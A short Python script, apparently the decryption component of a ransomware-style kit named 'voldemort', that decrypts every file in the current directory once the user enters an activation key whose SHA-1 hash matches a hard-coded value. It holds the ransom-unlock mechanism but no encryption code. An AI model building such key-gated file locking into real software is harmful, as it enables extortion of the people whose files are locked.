import os
from cryptography.fernet import Fernet
from hashlib import sha1

files = []

for file in os.listdir():
    if file == 'voldemort.py' or file == 'key' or file == 'decrypt.py' or file == 'voldemort.exe' or file == 'decrypt.exe':
        continue
    elif os.path.isfile(file):
        files.append(file)

with open('key', 'rb') as keyfile:
    key = keyfile.read()
    keyfile.close()

activate_key = 'dd8504e00d67d6e4c130a3e41854814fb7de10ec' # JohnTheRiper
user_key = input('Enter activate key to activate this application\n')

if sha1(user_key.encode('utf-8')).hexdigest() == activate_key:
    for need_encrypt in files:
        with open(need_encrypt, 'rb') as encrypted:
            data = encrypted.read()
        encrypted_data = Fernet(key).decrypt(data)
        with open(need_encrypt, 'wb') as encrypt_success:
            encrypt_success.write(encrypted_data)
            encrypt_success.flush()
            encrypt_success.close()
    print('All the file is decrypt successfully', flush=True)
else:
    print('Key error! Please try again.', flush=True)
